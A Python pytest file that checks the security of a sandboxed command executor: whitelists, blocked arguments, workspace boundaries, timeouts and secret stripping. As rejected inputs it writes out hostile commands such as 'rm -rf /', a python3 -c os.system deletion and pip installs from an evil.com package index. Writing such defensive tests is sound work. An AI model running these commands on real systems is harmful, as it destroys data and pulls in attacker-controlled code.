"""
tests/test_executor.py
───────────────────────
Security and execution tests for nexus.executor.safe_exec.

Coverage:
  - Command whitelist enforcement
  - Blocked argument pattern enforcement
  - Workspace boundary enforcement (path traversal / outside-workspace CWD)
  - Timeout enforcement
  - Valid command execution (stdout, returncode, success flag)
  - Empty / malformed command rejection
  - Environment sanitization (no secret leakage)
  - ExecResult properties

Design principles:
  - No mocking of the security layer itself — tests exercise real enforcement
  - Temporary directories are used as workspaces; always cleaned up
  - No network access required
  - No Ollama required
  - Every test is independent and idempotent

Run with:
    pytest tests/test_executor.py -v
"""
import os
import tempfile
import textwrap
from pathlib import Path
from unittest.mock import patch

import pytest

from nexus.core.exceptions import ExecutionError, SafetyViolation
from nexus.executor.safe_exec import (
    ALLOWED_EXECUTABLES,
    BLOCKED_ARG_PATTERNS,
    ExecResult,
    _sanitize_env,
    _validate_command,
    run_command,
)


# ─── Fixtures ─────────────────────────────────────────────────────────────────


@pytest.fixture()
def workspace(tmp_path):
    """
    Provide a real temp directory that is accepted as a valid workspace.
    Patches config.workspace_base to match so the boundary check passes.
    """
    with patch("nexus.executor.safe_exec.config") as mock_cfg:
        mock_cfg.workspace_base = str(tmp_path)
        mock_cfg.exec_timeout = 10
        yield tmp_path


@pytest.fixture()
def outside_dir(tmp_path):
    """
    A real temp directory that is NOT under workspace_base.
    Used to test the boundary enforcement.
    """
    outside = tmp_path / "outside"
    outside.mkdir()
    # workspace_base is set to a sibling directory — not a parent of `outside`
    workspace_root = tmp_path / "workspace"
    workspace_root.mkdir()
    with patch("nexus.executor.safe_exec.config") as mock_cfg:
        mock_cfg.workspace_base = str(workspace_root)
        mock_cfg.exec_timeout = 10
        yield outside


# ─── ExecResult ──────────────────────────────────────────────────────────────


class TestExecResult:
    def test_success_true_on_zero_returncode(self):
        r = ExecResult(returncode=0, stdout="ok", stderr="")
        assert r.success is True

    def test_success_false_on_nonzero_returncode(self):
        r = ExecResult(returncode=1, stdout="", stderr="err")
        assert r.success is False

    def test_success_false_when_timed_out_even_if_returncode_zero(self):
        # A process killed by SIGKILL may return 0 on some platforms;
        # timed_out=True must override that.
        r = ExecResult(returncode=0, stdout="", stderr="", timed_out=True)
        assert r.success is False

    def test_timed_out_defaults_to_false(self):
        r = ExecResult(returncode=0, stdout="", stderr="")
        assert r.timed_out is False


# ─── _validate_command ────────────────────────────────────────────────────────


class TestValidateCommand:

    # ── Whitelist enforcement ─────────────────────────────────────────────────

    def test_allowed_executables_pass(self):
        for exe in ALLOWED_EXECUTABLES:
            # Should not raise — use a harmless argument
            _validate_command([exe, "--version"])

    def test_unknown_executable_raises(self):
        with pytest.raises(SafetyViolation, match="not allowed"):
            _validate_command(["curl", "http://example.com"])

    def test_rm_raises(self):
        with pytest.raises(SafetyViolation, match="not allowed"):
            _validate_command(["rm", "-rf", "/"])

    def test_bash_raises(self):
        """bash is not in ALLOWED_EXECUTABLES."""
        with pytest.raises(SafetyViolation, match="not allowed"):
            _validate_command(["bash", "-c", "echo hi"])

    def test_full_path_executable_basename_checked(self):
        """Providing a full path like /usr/bin/curl must still be blocked."""
        with pytest.raises(SafetyViolation, match="not allowed"):
            _validate_command(["/usr/bin/curl", "http://example.com"])

    def test_python3_allowed(self):
        _validate_command(["python3", "script.py"])  # must not raise

    def test_pytest_allowed(self):
        _validate_command(["pytest", "-v"])  # must not raise

    # ── Blocked argument patterns ─────────────────────────────────────────────

    def test_dash_c_blocked(self):
        with pytest.raises(SafetyViolation, match="Blocked argument"):
            _validate_command(["python3", "-c", "import os; os.system('rm -rf /')"])

    def test_eval_blocked(self):
        with pytest.raises(SafetyViolation, match="Blocked argument"):
            _validate_command(["python3", "eval(malicious)"])

    def test_exec_blocked(self):
        with pytest.raises(SafetyViolation, match="Blocked argument"):
            _validate_command(["python3", "exec(code)"])

    def test_dunder_import_blocked(self):
        with pytest.raises(SafetyViolation, match="Blocked argument"):
            _validate_command(["python3", "__import__('os')"])

    def test_trusted_host_blocked(self):
        with pytest.raises(SafetyViolation, match="Blocked argument"):
            _validate_command(["pip", "install", "--trusted-host", "evil.com", "pkg"])

    def test_index_url_blocked(self):
        with pytest.raises(SafetyViolation, match="Blocked argument"):
            _validate_command(["pip", "install", "--index-url", "http://evil.com/simple"])

    def test_extra_index_url_blocked(self):
        with pytest.raises(SafetyViolation, match="Blocked argument"):
            _validate_command(["pip", "install", "--extra-index-url", "http://evil.com"])

    # ── Edge cases ────────────────────────────────────────────────────────────

    def test_empty_list_raises(self):
        with pytest.raises(SafetyViolation, match="Empty command"):
            _validate_command([])

    def test_empty_string_executable_raises(self):
        with pytest.raises(SafetyViolation, match="Empty command"):
            _validate_command([""])


# ─── _sanitize_env ────────────────────────────────────────────────────────────


class TestSanitizeEnv:

    def test_secrets_not_leaked(self):
        """Sensitive env vars must be stripped from the subprocess environment."""
        dangerous_keys = [
            "ANTHROPIC_API_KEY",
            "OPENAI_API_KEY",
            "AWS_SECRET_ACCESS_KEY",
            "DATABASE_URL",
            "TELEGRAM_BOT_TOKEN",
            "SECRET_KEY",
            "PASSWORD",
        ]
        with patch.dict(os.environ, {k: "super-secret" for k in dangerous_keys}):
            env = _sanitize_env()
        for key in dangerous_keys:
            assert key not in env, f"Secret key '{key}' leaked into subprocess env"

    def test_safe_keys_preserved(self):
        env = _sanitize_env()
        # PYTHONUNBUFFERED is always injected
        assert env.get("PYTHONUNBUFFERED") == "1"

    def test_env_is_dict(self):
        assert isinstance(_sanitize_env(), dict)

    def test_no_unknown_extras(self):
        """Env must only contain the allowed safe keys + PYTHONUNBUFFERED."""
        allowed = {"PATH", "HOME", "USER", "LANG", "LC_ALL",
                   "PYTHONPATH", "VIRTUAL_ENV", "PYTHONUNBUFFERED"}
        with patch.dict(os.environ, {"EVIL_VAR": "bad"}, clear=False):
            env = _sanitize_env()
        assert "EVIL_VAR" not in env
        for key in env:
            assert key in allowed, f"Unexpected key in sanitized env: {key}"


# ─── run_command — workspace boundary ────────────────────────────────────────


class TestWorkspaceBoundary:

    def test_cwd_outside_workspace_blocked(self, outside_dir):
        """
        CWD that is not under workspace_base must raise SafetyViolation,
        not execute the command.
        """
        with pytest.raises(SafetyViolation, match="outside workspace"):
            run_command(["python3", "--version"], cwd=str(outside_dir))

    def test_path_traversal_via_symlink_blocked(self, workspace):
        """
        A symlink inside the workspace pointing outside must be resolved
        to its real path — which is outside the workspace — and blocked.
        """
        outside = Path(tempfile.mkdtemp())
        try:
            link = workspace / "escape_link"
            link.symlink_to(outside)
            with pytest.raises(SafetyViolation, match="outside workspace"):
                run_command(["python3", "--version"], cwd=str(link))
        finally:
            import shutil
            shutil.rmtree(str(outside), ignore_errors=True)

    def test_valid_workspace_cwd_passes(self, workspace):
        """CWD inside workspace_base must not be blocked by boundary check."""
        result = run_command(["python3", "--version"], cwd=str(workspace))
        # python3 --version exits 0 on any sane system
        assert result.returncode == 0


# ─── run_command — execution ─────────────────────────────────────────────────


class TestRunCommand:

    def test_simple_python_script_succeeds(self, workspace):
        script = workspace / "hello.py"
        script.write_text("print('nexus_ok')\n")
        result = run_command(["python3", "hello.py"], cwd=str(workspace))
        assert result.returncode == 0
        assert "nexus_ok" in result.stdout
        assert result.success is True

    def test_failing_python_script_returns_nonzero(self, workspace):
        script = workspace / "fail.py"
        script.write_text("raise RuntimeError('intentional')\n")
        result = run_command(["python3", "fail.py"], cwd=str(workspace))
        assert result.returncode != 0
        assert result.success is False
        assert "intentional" in result.stderr

    def test_stdout_captured(self, workspace):
        script = workspace / "out.py"
        script.write_text("print('captured_output')\n")
        result = run_command(["python3", "out.py"], cwd=str(workspace))
        assert "captured_output" in result.stdout

    def test_stderr_captured(self, workspace):
        script = workspace / "err.py"
        script.write_text("import sys; sys.stderr.write('err_line\\n')\n")
        result = run_command(["python3", "err.py"], cwd=str(workspace))
        assert "err_line" in result.stderr

    def test_pytest_passing_tests(self, workspace):
        test_file = workspace / "test_pass.py"
        test_file.write_text(
            textwrap.dedent("""\
                def test_always_passes():
                    assert 1 + 1 == 2
            """)
        )
        result = run_command(["pytest", "test_pass.py", "-v"], cwd=str(workspace))
        assert result.returncode == 0
        assert result.success is True

    def test_pytest_failing_tests(self, workspace):
        test_file = workspace / "test_fail.py"
        test_file.write_text(
            textwrap.dedent("""\
                def test_always_fails():
                    assert 1 == 2, "intentional failure"
            """)
        )
        result = run_command(["pytest", "test_fail.py", "-v"], cwd=str(workspace))
        assert result.returncode == 1  # pytest exit 1 = test failures
        assert result.success is False

    def test_nonexistent_command_raises_execution_error(self, workspace):
        """
        An executable in the whitelist that doesn't exist on this machine
        should raise ExecutionError (FileNotFoundError wrapped), not crash.

        We whitelist 'node' but it may not be installed — this tests the
        FileNotFoundError path cleanly without depending on node.
        """
        # Write a fake script so the arg check passes
        script = workspace / "app.js"
        script.write_text("console.log('hi')")
        try:
            result = run_command(["node", "app.js"], cwd=str(workspace))
            # If node IS installed, it should run fine — test passes either way
            assert result.returncode == 0
        except ExecutionError as e:
            assert "not found" in str(e).lower() or "node" in str(e).lower()

    def test_output_size_capped(self, workspace):
        """
        Stdout/stderr must be capped at MAX_OUTPUT (10000 chars) to prevent
        memory exhaustion from runaway output.
        """
        script = workspace / "flood.py"
        # Generate ~50KB of output — well above the 10000-char cap
        script.write_text("print('x' * 50_000)\n")
        result = run_command(["python3", "flood.py"], cwd=str(workspace))
        assert len(result.stdout) <= 10_000, (
            f"stdout not capped: {len(result.stdout)} chars"
        )

    def test_returncode_is_int(self, workspace):
        script = workspace / "noop.py"
        script.write_text("pass\n")
        result = run_command(["python3", "noop.py"], cwd=str(workspace))
        assert isinstance(result.returncode, int)


# ─── run_command — timeout ────────────────────────────────────────────────────


class TestTimeout:

    def test_timeout_kills_process_and_sets_flag(self, workspace):
        """
        A process that sleeps longer than the timeout must be killed.
        timed_out must be True, returncode must be -1.
        """
        script = workspace / "sleep.py"
        script.write_text("import time; time.sleep(60)\n")
        result = run_command(
            ["python3", "sleep.py"],
            cwd=str(workspace),
            timeout=2,  # 2-second timeout against a 60-second sleep
        )
        assert result.timed_out is True
        assert result.returncode == -1
        assert result.success is False
        assert "timeout" in result.stderr.lower() or "killed" in result.stderr.lower()

    def test_fast_command_does_not_timeout(self, workspace):
        """A command that completes within the timeout must succeed normally."""
        script = workspace / "fast.py"
        script.write_text("print('done')\n")
        result = run_command(
            ["python3", "fast.py"],
            cwd=str(workspace),
            timeout=10,
        )
        assert result.timed_out is False
        assert result.returncode == 0

    def test_explicit_timeout_overrides_config(self, workspace):
        """Caller-supplied timeout must take precedence over config.exec_timeout."""
        script = workspace / "sleep2.py"
        script.write_text("import time; time.sleep(30)\n")
        # Pass timeout=1 explicitly — config has exec_timeout=10
        result = run_command(
            ["python3", "sleep2.py"],
            cwd=str(workspace),
            timeout=1,
        )
        assert result.timed_out is True


# ─── Integration: security + execution combined ───────────────────────────────


class TestSecurityIntegration:

    def test_blocked_command_never_reaches_execution(self, workspace):
        """
        SafetyViolation must be raised before subprocess.Popen is ever called.
        The dangerous command must produce zero side effects.
        """
        marker = workspace / "should_not_exist.txt"
        # This would create the file if it ran — it must not run
        with pytest.raises(SafetyViolation):
            run_command(
                ["bash", "-c", f"touch {marker}"],
                cwd=str(workspace),
            )
        assert not marker.exists(), "Blocked command had side effects — Popen was called"

    def test_dash_c_injection_never_executes(self, workspace):
        """
        python3 -c is in BLOCKED_ARG_PATTERNS. It must be rejected before
        any subprocess is spawned.
        """
        with pytest.raises(SafetyViolation, match="Blocked argument"):
            run_command(
                ["python3", "-c", "import os; os.makedirs('/tmp/nexus_pwned')"],
                cwd=str(workspace),
            )

    def test_cwd_traversal_attempt_blocked_before_execution(self, tmp_path):
        """
        A task trying to run code outside its workspace must be blocked
        at the boundary check, not at execution time.
        """
        workspace_root = tmp_path / "workspace"
        workspace_root.mkdir()
        attacker_dir = tmp_path / "attacker_dir"   # sibling — NOT under workspace
        attacker_dir.mkdir()

        with patch("nexus.executor.safe_exec.config") as mock_cfg:
            mock_cfg.workspace_base = str(workspace_root)
            mock_cfg.exec_timeout = 10
            with pytest.raises(SafetyViolation, match="outside workspace"):
                run_command(["python3", "--version"], cwd=str(attacker_dir))
